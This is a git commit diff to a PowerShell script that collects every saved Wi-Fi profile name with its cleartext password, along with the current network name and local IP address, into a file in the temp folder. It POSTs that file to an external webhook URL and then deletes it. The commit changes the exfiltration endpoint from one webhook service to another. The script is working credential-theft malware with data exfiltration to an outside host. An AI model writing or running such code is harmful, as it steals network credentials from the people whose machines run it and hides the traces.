d037cb35b101a093571453916c62833af94877ed
MrAbhinavJindal <106862837+MrAbhinavJindal@users.noreply.github.com>
2022-06-04 20:04:56 +0530

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -2,7 +2,7 @@ cd $env:temp
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > Wi-Fi-PASS
 (get-netconnectionProfile).Name >> Wi-Fi-PASS
 Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress >> Wi-Fi-PASS
-Invoke-WebRequest -Uri https://api.reliablewebhook.com/h/ymcilf62dwxounzx -Method POST -InFile Wi-Fi-PASS
+Invoke-WebRequest -Uri https://webhook.site/5a81bbad-90a5-40db-a015-ffb88c41bf74 -Method POST -InFile Wi-Fi-PASS
 Remove-Item *Wi-*
 
 $Acl = Get-Acl "D:\"
